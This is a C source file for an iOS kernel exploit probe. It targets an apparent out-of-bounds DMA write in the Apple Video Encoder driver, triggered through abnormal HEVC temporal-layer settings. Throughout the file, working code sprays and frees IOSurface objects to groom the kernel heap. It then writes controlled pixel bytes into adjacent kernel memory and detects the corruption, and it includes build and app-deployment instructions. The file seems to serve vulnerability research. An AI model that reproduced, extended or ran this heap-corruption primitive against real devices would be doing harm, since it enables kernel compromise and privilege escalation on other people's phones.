/*
 * ave_dma_surgical.c — Surgical DMA OOB Write Probe
 *
 * Leverages the confirmed finding that DMA OOB writes pixel data into
 * adjacent kernel heap memory, bypassing MIE. Uses small NTL values
 * (9-16) for minimal overflow to surgically corrupt adjacent objects.
 *
 * Key insight from panic analysis:
 *   - NTL=16463 caused x0=0x59 (frame 89 pixel fill = 0x59)
 *   - DMA writes pixel buffer content into kernel heap
 *   - Pixel data is fully controllable from userspace
 *
 * Strategy:
 *   1. Spray IOSurface objects with sentinel values
 *   2. Free every Nth to create holes for AVE DMA buffer
 *   3. Encode with NTL=9 (minimal overflow) using patterned pixels
 *   4. Check IOSurface sentinels — corruption = adjacent positioning confirmed
 *   5. Use controlled pixel data to write specific values into kernel memory
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_dma_surgical ave_dma_surgical.c -Wno-deprecated-declarations
 *
 * Deployed as: AVESurgical.app (com.research.avesurgical)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <signal.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

#define SPRAY_COUNT 512
#define HOLE_STRIDE 4
#define SPRAY_SIZE 16384

static IOSurfaceRef g_surfaces[SPRAY_COUNT];

static IOSurfaceRef create_sentinel_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 64, h = 64, bpr = 256, alloc = SPRAY_SIZE, fmt = 0x42475241;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);

    uint64_t sentinel = 0xDEAD000000000000ULL | ((uint64_t)idx << 16) | (idx & 0xFFFF);
    CFNumberRef nsen = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sentinel);
    CFDictionarySetValue(props, CFSTR("Sentinel"), nsen);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(nsen); CFRelease(props);
    return surf;
}

static int check_sentinel(IOSurfaceRef surf, int idx) {
    CFNumberRef val = (CFNumberRef)IOSurfaceCopyValue(surf, CFSTR("Sentinel"));
    if (!val) return -1;
    uint64_t sentinel = 0;
    CFNumberGetValue(val, kCFNumberSInt64Type, &sentinel);
    CFRelease(val);
    uint64_t expected = 0xDEAD000000000000ULL | ((uint64_t)idx << 16) | (idx & 0xFFFF);
    if (sentinel != expected) {
        p("  !! CORRUPTION surf[%d]: expected 0x%016llx got 0x%016llx\n",
          idx, (unsigned long long)expected, (unsigned long long)sentinel);
        return 1;
    }
    return 0;
}

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
}

static int do_encode(int ntl, int frames, uint8_t pixel_fill) {
    p("  Encoding: NTL=%d frames=%d fill=0x%02x\n", ntl, frames, pixel_fill);
    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
    CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn); CFRelease(fn);

    int cb = 0;
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, sa, NULL, encode_cb, &cb, &sess);
    CFRelease(sa);
    if (st || !sess) return -1;

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n; int v;
    v = 1; n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
    if (!pool) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -2; }

    for (int i = 0; i < frames; i++) {
        if (g_signal) break;
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, pixel_fill, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i,30), CMTimeMake(1,30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
        if (st) break;
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    p("  Callbacks: %d\n", cb);
    VTCompressionSessionInvalidate(sess); CFRelease(sess);
    return cb;
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler);
    signal(SIGSEGV, sig_handler);
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_surgical_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Surgical DMA Probe ===\nMode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("Modes:\n");
        p("  spray_check   - Spray+check sentinels (no encode, verify setup)\n");
        p("  spray_ntl9    - Spray + encode NTL=9 (1 entry overflow)\n");
        p("  spray_ntl16   - Spray + encode NTL=16 (8 entries overflow)\n");
        p("  spray_ntl32   - Spray + encode NTL=32 (24 entries overflow)\n");
        p("  multi_round   - 10 spray+encode rounds to increase hit probability\n");
        p("  pattern_aa    - Spray + NTL=9 with 0xAA pixel fill (marker)\n");
        p("  pattern_00    - Spray + NTL=9 with 0x00 pixel fill (zero-out)\n");
    } else if (strcmp(mode, "spray_check") == 0) {
        p("Phase 1: Spraying %d IOSurfaces (alloc=%d)...\n", SPRAY_COUNT, SPRAY_SIZE);
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_sentinel_surface(i);
        int created = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
        p("  Created: %d\n", created);
        for (int i = 0; i < SPRAY_COUNT && g_surfaces[i]; i += 64)
            p("  surf[%d] id=%u alloc=%zu\n", i, IOSurfaceGetID(g_surfaces[i]),
              IOSurfaceGetAllocSize(g_surfaces[i]));
        int ok = 0, bad = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            if (check_sentinel(g_surfaces[i], i) == 0) ok++; else bad++;
        }
        p("  Sentinel check: %d ok, %d corrupted (pre-encode baseline)\n", ok, bad);
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);

    } else if (strncmp(mode, "spray_ntl", 9) == 0) {
        int ntl = atoi(mode + 9);
        if (ntl < 2) ntl = 9;
        p("=== Spray + Encode NTL=%d ===\n", ntl);
        p("Phase 1: Spray %d IOSurfaces\n", SPRAY_COUNT);
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_sentinel_surface(i);
        p("Phase 2: Free every %dth surface (create holes)\n", HOLE_STRIDE);
        int freed = 0;
        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE) {
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; freed++; }
        }
        p("  Freed %d surfaces\n", freed);
        p("Phase 3: Encode with NTL=%d, pixel=0xBB\n", ntl);
        do_encode(ntl, 5, 0xBB);
        usleep(200000);
        p("Phase 4: Check sentinels for corruption\n");
        int ok = 0, bad = 0, miss = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) { miss++; continue; }
            if (check_sentinel(g_surfaces[i], i) == 0) ok++; else bad++;
        }
        p("  Results: %d ok, %d CORRUPTED, %d freed\n", ok, bad, miss);
        if (bad > 0) p("\n*** HEAP CORRUPTION DETECTED ***\n");
        else p("  No corruption detected (need more spray or different zone)\n");
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);

    } else if (strcmp(mode, "multi_round") == 0) {
        p("=== Multi-Round Spray (10 rounds) ===\n");
        int total_bad = 0;
        for (int round = 0; round < 10; round++) {
            if (g_signal) break;
            p("\n--- Round %d ---\n", round);
            for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_sentinel_surface(i);
            for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            do_encode(9, 3, 0xCC + round);
            usleep(100000);
            int ok = 0, bad = 0;
            for (int i = 0; i < SPRAY_COUNT; i++) {
                if (!g_surfaces[i]) continue;
                if (check_sentinel(g_surfaces[i], i) == 0) ok++; else bad++;
            }
            p("  Round %d: %d ok, %d corrupted\n", round, ok, bad);
            total_bad += bad;
            for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);
            usleep(500000);
        }
        p("\n=== Total corruptions across 10 rounds: %d ===\n", total_bad);
        if (total_bad > 0) p("*** DMA OOB HEAP CORRUPTION CONFIRMED ***\n");

    } else if (strncmp(mode, "pattern_", 8) == 0) {
        uint8_t fill = 0;
        if (strcmp(mode + 8, "aa") == 0) fill = 0xAA;
        else if (strcmp(mode + 8, "00") == 0) fill = 0x00;
        else fill = (uint8_t)strtol(mode + 8, NULL, 16);
        p("=== Pattern Test: fill=0x%02x, NTL=9 ===\n", fill);
        for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_sentinel_surface(i);
        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
        do_encode(9, 5, fill);
        usleep(200000);
        int ok = 0, bad = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            if (check_sentinel(g_surfaces[i], i) == 0) ok++; else bad++;
        }
        p("  Results: %d ok, %d CORRUPTED\n", ok, bad);
        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) CFRelease(g_surfaces[i]);
    } else {
        p("Unknown mode: %s\n", mode);
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
